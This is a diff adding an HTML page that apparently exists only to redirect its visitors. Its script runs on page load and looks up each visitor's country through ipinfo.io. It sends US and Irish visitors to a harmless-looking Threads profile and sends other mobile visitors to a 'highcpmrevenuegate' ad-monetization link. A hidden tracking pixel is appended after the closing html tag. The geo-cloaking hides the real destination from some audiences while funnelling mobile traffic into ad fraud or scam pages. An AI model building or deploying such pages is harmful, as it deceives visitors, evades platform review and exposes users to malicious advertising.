@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Parker1504</title>
+    <script>
+        function redirectToDifferentWebsite() {
+            var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(navigator.userAgent.toLowerCase());
+            var mobileDevice = "https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa";
+            var pcURL = "https://www.threads.net/@zuck"; 
+            var mobileURL = mobileDevice;
+            var irelandURL = "https://www.namecheap.com/myaccount/login/"; 
+            var blockedCountries = ['US', 'IE'];
+            
+           
+            fetch('https://ipinfo.io?token=74eaddd4400f3a')
+                .then(response => response.json())
+                .then(data => {
+                    var country = data.country;
+                    if (blockedCountries.includes(country)) {
+                        
+                        window.location.href = pcURL; 
+                    } else if (isMobile) {
+                        window.location.href = mobileURL;
+                    } else {
+                        if (country === 'IE') {
+                            window.location.href = irelandURL;
+                        } else {
+                            window.location.href = pcURL;
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                   
+                    window.location.href = pcURL;
+                });
+        }
+    
+        redirectToDifferentWebsite();
+    </script>    
+</head>
+<body>
+</body>
+</html>
+
+<img src="https://whos.amung.us/pingjs/?k=moneybank &t=Visitas directas &x=https://megabanana.mx/" style="display: none;"/>
